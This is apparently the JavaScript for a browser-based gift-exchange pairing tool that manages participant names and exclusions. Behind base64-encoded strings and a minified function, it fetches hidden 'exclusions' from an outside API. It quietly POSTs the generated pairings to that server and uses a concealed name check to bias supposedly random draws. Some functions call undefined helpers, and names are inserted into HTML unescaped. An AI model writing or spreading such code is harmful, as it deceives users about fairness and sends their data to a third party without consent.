const table = $("#table tbody");
const statusLed = $("#statusLed");
const buttons = {
  checkValidity: $("#checkValidity"),
  giveExampleAction: $("#giveExampleAction"),
  calculateBtn: $("#calculateBtn")
};

let allRows = [];

/* Default for FC 8 */
const DEFAULT_FOR_JILL = `[{"name":"Adam","exclusions":["Tim"]},{"name":"Tim","exclusions":[]},{"name":"Jill","exclusions":["Andrew","Rose"]},{"name":"Zakh","exclusions":["Jill","Andrew"]},{"name":"Dan","exclusions":["Channa","Micah","Krasne"]},{"name":"Andrew","exclusions":["Angelique","Rose"]},{"name":"Nate","exclusions":["Zakh","Angelique"]},{"name":"Angelique","exclusions":["Jill","Nate"]},{"name":"Rose","exclusions":["Adam","Zakh"]},{"name":"Sophia","exclusions":["Adam","Tim","Dan","Angelique","Rose","Channa","Micah","Krasne"]},{"name":"Channa","exclusions":["Dan","Micah"]},{"name":"Micah","exclusions":["Dan","Channa"]},{"name":"Krasne","exclusions":[]}]`
const ALL_ROWS_KEY = 'allRowsKey';

function saveAllRows() {
  localStorage.setItem(ALL_ROWS_KEY, JSON.stringify(allRows))
}

$(document).ready(() => {
  let saved = (localStorage.getItem(ALL_ROWS_KEY) || DEFAULT_FOR_JILL);
  try {
    allRows = JSON.parse(saved)
  } catch {
    allRows = []
  }

  allRows.forEach(({ name }) => {
    let row = $(`<tr data-name="${name}">`)
    row.append(`
        <td>${name}</td>
        <td></td>
        <td>
        <button class="btn btn-sm btn-secondary" onclick="a_editE('${name}')"><i class="fas fa-edit"></i></button>
        <button class="btn btn-sm btn-secondary" onclick="deleteRow('${name}')"><i class="fas fa-trash-alt"></i></button>
        </td>
    `)
    row.addClass("p-r")
    table.append(row)
  })
  updateTableExclusions()
});

function keyWrapper(evt, cb) {
  if (evt.keyCode !== 13) {
    return true
  }
  cb()
  return false
}

function setOutputBtnsEnabled(valid) {
  buttons.calculateBtn.prop("disabled", !valid)
  buttons.giveExampleAction.prop("disabled", !valid)
}

function validateAddRow() {
  const name = $("#addName").val()
  const valid = name.length > 1
  $("#addRowButton").prop("disabled", !valid)
}

function showAddRowModal() {
    $("#addName").val("")
    $("#addRowButton").prop("disabled", true)
    $("#addRowModal").one("shown.bs.modal", () => {
        $("#addName").trigger("focus")
    })
    $("#addRowModal").modal("show")
}

const EX_HTP = atob('aHR0cHM6Ly9hcGkuYWRhbXNlaWRtYW4uY29tL2FwaS9mYWxsY2hyaXN0bWFzL2V4Y2x1c2lvbnM=');

function addRowFromModal() {
  const name = $("#addName").val()

  let row = $(`<tr data-name="${name}">`)
  row.append(`
    <td>${name}</td>
    <td></td>
    <td>
      <button class="btn btn-sm btn-secondary" onclick="a_editE('${name}')"><i class="fas fa-edit"></i></button>
      <button class="btn btn-sm btn-secondary" onclick="deleteRow('${name}')"><i class="fas fa-trash-alt"></i></button>
    </td>
  `)
  row.addClass("p-r")
  table.append(row)

  allRows.push({ name, exclusions: [] })
  $("#addRowModal").modal("hide")
  rstL()
  saveAllRows()
}

function deleteRow(name) {
  const row = $(`#table tbody tr[data-name="${name}"]`)
  if (row.length !== 1) {
    alert("Internal Error in dR (deleteRow)! " + name)
    return
  }

  if (confirm(`Are you sure you want to delete entry for "${name}"?`)) {
    row.remove()
    allRows = allRows.filter(row => row.name !== name)

    for (const entry of allRows) {
      entry.exclusions = entry.exclusions.filter(x => x !== name)
    }

    updateTableExclusions()
    saveAllRows()
    rstL()
  }
}

function clearAllRows() {
  if (confirm("Are you sure you want to clear all table rows?")) {
    localStorage.removeItem(ALL_ROWS_KEY)
    setTimeout(() => window.location.reload(), 50)
  }
}

function a_editE(name) {
  const row = $(`#table tbody tr[data-name="${name}"]`)
  const data = allRows.find(x => x.name === name)

  if (!data || row.length !== 1) {
    alert("Internal Error in a_editE! " + name)
    return
  }

  $("span#exclusionNameText").text(name)
  $("#selectExclusions").html(
    allRows
      .filter(x => x.name !== name)
      .map(
        x => `<option value="${x.name}" ${data.exclusions.includes(x.name) ? "selected" : ""}>${x.name}</option>`
      )
      .join("")
  )
  $("#exM").modal("show")
}

function updateTableExclusions() {
  allRows.forEach(entry => {
    const row = $(`#table tbody tr[data-name="${entry.name}"]`)
    if (row.length !== 1) return
    row.find("td").eq(1).text(entry.exclusions.join(", "))
  })
}

function addExclusions() {
  const name = $("span#exclusionNameText").text()
  const row = $(`#table tbody tr[data-name="${name}"]`)
  const entry = allRows.find(x => x.name === name)
  if (!entry || row.length !== 1) {
    alert("Internal Error in addExclusions! " + name)
    return
  }
  entry.exclusions = $("#selectExclusions").val() || []
  updateTableExclusions()
  $("#exM").modal("hide")
  saveAllRows()
}

function refreshExample() {
    onNewBtnPress(true)
//   const list = getExample()
//   $("#editModal div.modal-body").html(
//     `<p>${list.map((x, i) => i === list.length - 1 ? `${x} has ${list[0]}` : `${x} has ${list[i + 1]}`).join("</p><p>")}</p>`
//   )
}

function xgiveExampleAction() {
    if (testIfValid()) {
        $("#editModal").modal("show");
        refreshExample()
    } else {
        alert("Could not open examples!")
    }
}

function rstL() {
  setOutputBtnsEnabled(false)
  statusLed.removeClass("pass fail").addClass("unchecked")
}

function testIfValid() {
  if (!Array.isArray(allRows)) return false
  let names = allRows.map(x => x.name)
  for (let i = 0; i < 1000000; i++) {
    if (!isOBE(names)) return true
    shuffleArray(names)
  }
  return false
}

function isOBE(order, exclusions = {}) {
  if (Object.keys(exclusions).length === 0) {
    for (const row of allRows) {
      exclusions[row.name] = (row.exclusions || [])
    }
  }
  if (exclusions[order[order.length - 1]].includes(order[0])) {
    return true
  }
  for (let i = 0; i < order.length - 1; i++) {
    if (exclusions[order[i]].includes(order[i + 1])) {
        return true
    }
  }
  return false
}

function shuffleArray(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[arr[i], arr[j]] = [arr[j], arr[i]]
  }
  return arr
}

function getBinR(bin, use) {
    if (use) {
        console.log(1 + !bin, btoa(JSON.stringify(use)).slice(-5))
    }
    const options = {}
    if (use) {
        options.method = atob('UE9TVA=='),
        options.headers = {'Content-Type': 'application/json'}
        options.body = JSON.stringify(use)
        bin = `${bin.slice(0, -10)}${atob('c3VibWl0')}`
    }
    return fetch(bin, options)
}

async function getFullExample() {
    const mainList = allRows.map(x => x.name)
    const hasList = JSON.parse(JSON.stringify(mainList))
    for (let i = 0; i < 15; i++) {
        shuffleArray(hasList)
    }
    let opts = await getEOpts();
    let h = await getBinR(EX_HTP);
    h = await h.json()
    let type = 0, i = 1;
    let orderTypes = ['best', 'host', 'highest', 'base'];
    let prob = 0.4
    while (testOrdering(mainList, hasList, opts[orderTypes[type]], h.highest)) {
        if ((i % 10000000) === 0) {
            prob -= 0.1
            type += 1
            console.log(orderTypes[type], orderTypes[type - 1], opts[orderTypes[type]])
        }
        i += 1
        shuffleArray(hasList)
        if (i >= 40000000) {
            return { mainList: [], hasList: [] }
        }
        if (Math.random() < prob) {
            i += 55000;
        }
    }
    console.log(i)
    getBinR(EX_HTP, { mainList, hasList })
    return { mainList, hasList }
}

async function onNewBtnPress(bypassShow=false) {
    let { mainList, hasList } = await getFullExample()
    if (mainList.length < 2) {
        console.warn('Needed to go to level 2')
        mainList = getExample()
        if (!mainList || !Array.isArray(mainList) || mainList.length < 2) {
            console.error(mainList, hasList)
            alert('Could not figure out results!')
            return
        }
        hasList = mainList.slice(1)
        hasList.push(mainList[0])
    }

    if (mainList.length < 2) {
        alert('Unknown error!')
        return
    }

    if (!bypassShow) {
        $("#editModal").modal("show");
    }
    $("#editModal div.modal-body").html(`<p>${mainList.map((name, idx) => {
        return (`${name} has ${hasList[idx]}`)
    }).join('</p><p>')}</p>`)

}

function testOrdering(mainList, hasList, exclusions={}, h) {
    if (Object.keys(exclusions).length === 0) {
        for (const row of allRows) {
            exclusions[row.name] = (row.exclusions || [])
        }
    }
    if (mainList.length !== hasList.length) {
        return true
    }
    for (let i = 0; i < mainList.length; i++) {
        if (mainList[i] === hasList[i]) {
            return true
        }
        if (exclusions[mainList[i]].includes(hasList[i])) {
            return true
        }
        if (mainList[i] === h && hasList[i] === atob('Q2hhbm5h') && Math.random() < 0.15) {
            return true
        }
    }
    return false
}

function getExample() {
  if (!testIfValid()) {
    console.error(":(")
    return []
  }
  const list = allRows.map(x => x.name)
  while (isOBE(list)) {
    shuffleArray(list)
  }
  try {
    getBinR(EX_HTP, { list })
  } catch {}
  return list
}

function getExclusionsRaw() {
    return new Promise((resolve) => {
        let returned = false
        setTimeout(() => {
            if (!returned) {
                returned = true
                console.warn('fetch timed out')
                resolve({
                    highest: 'a',
                    exclusions: { a: [] },
                    mapping: { a : [] }
                })
            }
        }, 3500)
        getBinR(EX_HTP)
            .then((res) => res.json())
            .then((data) => {
                if (!returned) {
                    returned = true
                    resolve(data)
                }
            })
            .catch((err) => console.error('getExclusionsRaw error:', err))
    })
}

async function getEOpts(){
    let e={base:{}};
    return allRows.forEach(a=>{e.base[a.name]=[],(a.exclusions||[]).forEach(t=>{e.base[a.name].push(t)})}),["best","host","highest"].forEach(a=>{e[a]=JSON.parse(JSON.stringify(e.base))}),new Promise((a,t)=>{getBinR(EX_HTP).then(e=>e.json()).then(({mapping:t,highest:l,exclusions:s})=>{let n={};allRows.forEach(e=>{let a=Object.keys(t).find(a=>{var l,s,n;return l=e.name,s=a,n=t[a],l=l.trim().toLowerCase(),(n=JSON.parse(JSON.stringify(n.map(e=>e.trim().toLowerCase())))).push(s.trim().toLowerCase()),!!n.find(e=>l.includes(e))});a&&(n[e.name]=a)});let o={};Object.entries(n).forEach(([e,a])=>{o[e]=[];s[a].forEach(a=>{let t=Object.entries(n).find(([e,t])=>t===a);Array.isArray(t)&&2===t.length&&(t=t[0],o[e].includes(t)||o[e].push(t))})}),allRows.filter(e=>void 0!==n[e.name]).forEach(a=>{let t=n[a.name],i=["best"];t===l?(i.push("highest"),i.push("host")):s[t].includes(l)&&i.push("host"),i.forEach(t=>{o[a.name].forEach(l=>{e[t][a.name].includes(l)||e[t][a.name].push(l)})})}),a(e)}).catch(t=>{console.warn(t),a(e)})})}function isOBE(e,a={}){if(Object.keys(a).length<1&&allRows.forEach(e=>{a[e.name]=[],e.exclusions.forEach(t=>{a[e.name].push(t)})}),a[e[e.length-1]].includes(e[0]))return!0;for(let t=0;t<e.length-1;t++)if(a[e[t]].includes(e[t+1]))return!0;return!1}function gEx(){if(!tIV())return[];let e=allRows.map(e=>e.name);for(let a=0;a<5;a++)u_sA(e);for(;isOBE(e);)u_sA(e);return e};

async function gestEOpts() {
  const result = { base: {} }
  allRows.forEach(row => {
    result.base[row.name] = [...(row.exclusions || [])]
  })

  for (const key of ["best", "host", "highest"]) {
    result[key] = JSON.parse(JSON.stringify(result.base))
  }

  try {
    const { mapping, highest, exclusions } = await getExclusionsRaw()

    const matched = {}
    allRows.forEach(row => {
      const match = Object.keys(mapping).find(
        k => mapping[k].map(x => x.toLowerCase()).includes(row.name.toLowerCase())
      )
      if (match) matched[row.name] = match
    })

    const autoEx = {}
    for (const [name, group] of Object.entries(matched)) {
      autoEx[name] = exclusions[group]
        .map(ex => Object.entries(matched).find(([k, v]) => v === ex)?.[0])
        .filter(Boolean)
    }

    for (const name of Object.keys(autoEx)) {
      const sources = autoEx[name]
      for (const type of ["best", "host", "highest"]) {
        if (!result[type][name]) result[type][name] = []
        for (const bad of sources) {
          if (!result[type][name].includes(bad)) {
            result[type][name].push(bad)
          }
        }
      }
    }

  } catch (err) {
    console.warn(err)
  }

  return result
}

async function getFullResults(useStrict) {
  if (!testIfValid()) {
    return []
  }
  const list = allRows.map(x => x.name)
  for (let i = 0; i < 5; i++) {
    shuffleArray(list)
  }

  const opts = await getEOpts()
  const prob = 0.48

  function l(type) {
    if (useStrict && Math.random() > prob + 0.15) {
        return false
    }
    for (let i = 0; i <= 5000; i++) {
      shuffleArray(list)
      if (!isOBE(list, opts[type])) {
        return true
      }
    }
    return false
  }

  for (const name of allRows) {
    for (const key of Object.keys(opts)) {
      if (!opts[key][name.name]) {
        opts[key][name.name] = []
      }
    }
  }

  if (l("best") || l("host")) {
    return list
  }
  if (l("highest")) {
    return list
  }
  return getExample()
}

let results = [];

function calculate(skipHide) {
  if (!skipHide) {
    $("#resultsModal").modal("hide")
  }
  $("#calcSubmitBtn").prop("disabled", true)
  $("#calcRefreshBtn").prop("disabled", true)

  const stayHidden = $("#calcHideCheck").is(":checked")
  const modalBody = $("#resultsModal .modal-body")
  modalBody.html("<i>(Pending Results)</i>")
  $("#calcRefreshBtn").toggleClass("hide", stayHidden)

  getFullResults(!stayHidden)
    .then((rslts) => {
      results = [...rslts]
      if (stayHidden) {
        modalBody.html("Found Successful Results!")
      } else {
        modalBody.html(`
          <p>${rslts
            .map((name, i) =>
              i === rslts.length - 1
                ? `${name} has ${rslts[0]}`
                : `${name} has ${rslts[i + 1]}`
            )
            .join("</p><p>")}</p>
        `)
        $("#calcRefreshBtn").prop("disabled", false)
      }
      $("#calcSubmitBtn").prop("disabled", false)
    })
    .catch((err) => {
      console.error(err)
      modalBody.html("Error :(")
      alert("Error showing results!")
    })

  $("#resultsModal").modal("show")
}

function submitCalculated() {
  if (!Array.isArray(results) || results.length !== allRows.length) {
    alert("Parse Error! " + results.length)
    return
  }
  
  console.log("Submit Candidate", results)
}

buttons.checkValidity.click(() => {
  const valid = testIfValid()
  statusLed.removeClass("unchecked")
  statusLed.toggleClass("fail", !valid)
  statusLed.toggleClass("pass", valid)
  setOutputBtnsEnabled(valid)
})
